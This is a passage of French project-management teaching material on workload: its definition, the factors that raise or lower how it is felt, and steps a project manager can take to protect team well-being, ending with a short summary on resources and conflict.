   - La charge de travail fait r√©f√©rence √† la quantit√© de travail qu'un individu ou une √©quipe doit accomplir dans le cadre d'un projet.
   - Certains facteurs li√©s √† la charge de travail sont d√©finis par la l√©gislation ou les conventions collectives, tels que le temps de travail hebdomadaire, les repos obligatoires, ou les cong√©s pay√©s.
   - Cependant, la perception de la charge de travail peut varier d'un membre de l'√©quipe √† l'autre et d√©pend de facteurs subjectifs.

2. Facteurs augmentant la perception de la charge de travail :
   - Les facteurs augmentant la perception de la charge de travail sont souvent li√©s au contexte de travail. Ils incluent des outils informatiques peu ergonomiques, un flux continu d'informations provenant de multiples canaux, et d'autres √©l√©ments qui peuvent cr√©er du stress.
   - Les relations personnelles, la vie familiale, et la perception individuelle des capacit√©s de travail peuvent √©galement influencer cette perception.

3. Facteurs r√©duisant la perception de la charge de travail :
   - Des √©quipes bien soud√©es, une gestion qui prend en compte le bien-√™tre individuel, des formations appropri√©es, une reconnaissance √©quitable du travail accompli sont autant de facteurs qui r√©duisent la perception de la charge de travail.

4. Comment r√©duire la perception de la charge de travail ?
   - √âtant donn√© que la charge de travail est souvent subjective, il est difficile de l'√©valuer de mani√®re pr√©cise.
   - Toutefois, il incombe √† l'entreprise et au chef de projet de prendre des mesures pour √©liminer ou r√©duire les facteurs de stress li√©s √† la charge de travail.
   - Cela peut inclure la cr√©ation d'un environnement de travail agr√©able avec un contr√¥le du bruit, une bonne √©clairage, des horaires flexibles, et des outils ergonomiques.
   - Les chefs de projet doivent √©galement prot√©ger leur √©quipe, favoriser le travail en groupe, renforcer la confiance, valoriser les comp√©tences individuelles et collectives, et r√©agir rapidement en cas de surcharge ou de sous-charge de travail.
   - Pour cela, les chefs de projet disposent d'outils tels que le coaching individualis√©, les formations individuelles ou collectives, les activit√©s de renforcement de l'esprit d'√©quipe, l'affectation ad√©quate des t√¢ches, et l'implication de l'√©quipe dans la planification et la gestion des ressources.

En conclusion, la charge de travail est un concept complexe influenc√© par des facteurs objectifs et subjectifs. Il est essentiel pour les chefs de projet de prendre en compte ces facteurs et de mettre en place des mesures pour garantir le bien-√™tre de leur √©quipe tout en maintenant l'efficacit√© du projet.

Essentiel
Les ressources mat√©rielles et humaines bien qu'indispensables √† tous projets sont souvent la source de probl√®mes li√©s √† leur disponibilit√© ou √† leurs co√ªts. Il appartient au chef de projet de s'assurer de la bonne disponibilit√© et de la meilleure gestion possible des ressources en mettant en ≈ìuvre ses talents de n√©gociateur. Le chef de projet devra g√©rer les conflits qui ne manqueront pas d'arriver, avec tout le tact et la patience n√©cessaires √† la bonne marche du projet.

Le pass√© r√©cent dans l'industrie automobile et t√©l√©phonique fran√ßaise d√©montre les d√©g√¢ts humains qu'entra√Æne une charge de travail trop √©lev√©e. Les chefs de projet devront prot√©ger leurs √©quipes de ce fl√©au des temps modernes pour le bien-√™tre de leurs √©quipes et au b√©n√©fice du projet.‚ÄÉ
"
